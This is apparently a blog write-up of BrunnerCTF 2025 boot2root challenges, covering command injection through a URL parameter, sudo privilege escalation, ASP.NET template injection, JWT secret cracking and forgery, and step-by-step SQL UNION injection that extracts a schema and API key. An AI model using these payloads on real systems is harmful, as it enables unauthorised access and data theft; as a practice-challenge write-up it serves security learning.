---
layout: post
title:  "BrunnerCTF 2025 Boot2Root Challenges"
date:   2025-08-24 22:43:10 -0400
author: robo.uzi
tags: [CTF, boot2root]
---
* TOC
{:toc}

## Caffeine (User)
**Category:** Boot2root

**Difficulty:** Beginner  
**Author:** Quack

This new coffee shop recently opened and you've been waiting too long for your daily caffeine _injection_! Can you find a way to see a little more than just your order status?

> Boot2root challenges are about privilege escalation, normally from a low-privilege user to administrator, or "root". The initial access is often from a web application and typically involve getting a reverse shell or some other remote code execution (RCE) on a server. From there, the point is to get root access on the system. These challenges are split into two parts: user and root. They can only be solved in order.

_The user flag is in a file called `user.txt`._
Note: The series continues in `Caffeine (Root)`.

I visit the site and see it is for placing coffee orders and checking the order status. You can make a POST request when ordering, and a GET request to check order status. 

After some testing I try this: `https://caffeine-user-cdb336a4ada8363d.challs.brunnerne.xyz/?order_id=135|id`. In the output I see `uid=33(www-data) gid=33(www-data) groups=33(www-data)`. Good we have RCE. 

Visit `https://caffeine-user-cdb336a4ada8363d.challs.brunnerne.xyz/?order_id=135|cat%20user.txt` and get the flag `brunner{C0Ff33_w1Th_4_51d3_0F_c0MM4nD_1nj3Ct10n!}`.

___

## Caffeine (Root)
**Category:** Boot2root

**Difficulty:** Beginner  
**Author:** Quack
{% raw %}
Now that you have access to their system, is there any way you can escalate your privileges and read the final flag?

_The root flag is located in `/root/root.txt`_.

I run `ls -la` and see there is a hint. I run `cat hint.txt` and see: Are there any files you *sudo'ent* (shouldn't) be able to run as a normal user?

Search for suids with `find / -perm /u=s -type f 2>/dev/null`. 

`https://caffeine-user-cdb336a4ada8363d.challs.brunnerne.xyz/?order_id=127|sudo -l` shows:
```
### Order Status for #127|sudo -l

Matching Defaults entries for www-data on ctf-caffeine-user-cdb336a4ada8363d-cb5d99db8-9pght:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ctf-caffeine-user-cdb336a4ada8363d-cb5d99db8-9pght:
    (ALL) NOPASSWD: /usr/local/bin/brew
```

Visit `https://caffeine-user-cdb336a4ada8363d.challs.brunnerne.xyz/?order_id=127|sudo%20/usr/local/bin/brew%20/root/root.txt` and get the flag:
```
### Order Status for #127|sudo /usr/local/bin/brew /root/root.txt

   ( (
    ) )
   ( (
  .-'--.
  |◉.◉|  
  |    |  
  '~~~~'  
   ROOT PRIVILEGES DETECTED
   JavaJack's *Special Reserve* Brew

  Brewing your file reading...
═══════════════════════════════════════════════
brunner{5uD0_pR1V1L3g35_T00_h0t_F0r_J4v4_J4CK!}
═══════════════════════════════════════════════

    ) )
   ( (
  .-'-.
  |‼.‼|  
  |   |  
  '~~~'  
   Root Brew Successful!

No order found with ID #127|sudo /usr/local/bin/brew /root/root.txt
```
{% endraw %}
___

## Dotwhat..? (User)
**Category:** Boot2Root

**Difficulty:** Easy-Medium  
**Author:** Quack

Tell me your favourite recipe! The user flag is in a file called `user.txt`.

The site allows you to create a new recipe with a POST request. There are 3 fields. Title, Ingredients, and Instructions. You can make a GET request to view saved recipes. In wappalyzer I see it uses ASP.NET. Looks like serverside template injection.

I test the payload `@System.IO.File.ReadAllText("../user.txt")` in the instructions field and recieve the flag: 
`brunner{m0R3_l1K3_r3c1P3_1NJ3ct1On!}`.

___

## Tickets App (User)
**Category:** Boot2Root
**Difficulty:** Medium  
**Author:** ha1fdan (+ Nissen)

Man, I really wanted to see _Brunner & Bass_, but the tickets app says they're sold out! Maybe there's another way to get myself a ticket...

_The user flag is in a file called `user.txt`._

This one is an honorable mention. I did not get the flag because I didnt check `robots.txt`. I open the site and see I have a json web token (JWT) after I create an account and login. I put it into a file and crack the secret:
```shell
/usr/sbin/john --wordlist=/usr/share/wordlists/rockyou.txt jwt.txt  
Using default input encoding: UTF-8  
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])  
Will run 2 OpenMP threads  
Press 'q' or Ctrl-C to abort, almost any other key for status  
secretkey        (?)        
1g 0:00:00:00 DONE (2025-08-24 02:41) 2.222g/s 2903Kp/s 2903Kc/s 2903KC/s service0..seanmclean01  
Use the "--show" option to display all of the cracked passwords reliably  
Session completed.
```
I get the secret: `secretkey`.

When I'm logged in all I can see is my username and `Admin: False`. I create a python script to generate a jwt that allows me to become admin:
```python
import jwt

payload = {
    "user": "admin",
    "admin": True
}

secret = "secretkey"
token = jwt.encode(payload, secret, algorithm="HS256")
print(token)
```
Once I am admin I can search for users on the dashboard!

For example searching for `admin` makes a GET request to `https://tickets-app-user-0a24104bb2f7cad1.challs.brunnerne.xyz/api/search?name=admin`. 

Visiting that link I see: `[{"id":1,"is_admin":1,"password":"00ea23da62544a6e7f699a3a24e87044","username":"admin"}]`.

I visit my own profile and grab the password hash. Inputting it to `https://crackstation.net/` proves it is an md5 hash as I chose a simple password and it cracked it.

In the search bar `' OR 1=1 --` returns all users (me and admin). 

`' UNION SELECT NULL,NULL,NULL,NULL --` tells me there are 4 columns.

`' UNION SELECT name,NULL,NULL,NULL FROM sqlite_master WHERE type='table' --` confirms sqlite. 

`' UNION SELECT NULL,name,NULL,NULL FROM sqlite_master WHERE type='table' --`:
```
|Username|Admin Privileges|
|---|---|
|settings|No|
|sqlite_sequence|No|
|users|No|
|admin|Yes|
|uzi|No|
```

`' UNION SELECT NULL,sql,NULL,NULL FROM sqlite_master --`:
```
|Username|Admin Privileges|
|---|---|
||No|
|CREATE TABLE settings ( id INTEGER PRIMARY KEY AUTOINCREMENT, key TEXT NOT NULL UNIQUE, value TEXT )|No|
|CREATE TABLE sqlite_sequence(name,seq)|No|
|CREATE TABLE users ( id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT NOT NULL UNIQUE, password TEXT NOT NULL, is_admin BOOLEAN NOT NULL DEFAULT FALSE )|No|
|admin|Yes|
|uzi|No|
```

`' UNION SELECT NULL,value,NULL,NULL FROM settings --`:
```
|Username|Admin Privileges|
|---|---|
|BrunnerCTF|No|
|Tickets App|No|
|false|No|
|jmHdkzfav1nr4XKvrVWPyg1XHeLtlTX0|No|
|admin|Yes|
|uzi|No|
```

`' UNION SELECT NULL,key,NULL,NULL FROM settings -- `:
```
|Username|Admin Privileges|
|---|---|
|api_key|No|
|ctf_name|No|
|development_mode|No|
|site_name|No|
|admin|Yes|
|uzi|No|
```

`api_key = jmHdkzfav1nr4XKvrVWPyg1XHeLtlTX0`

___
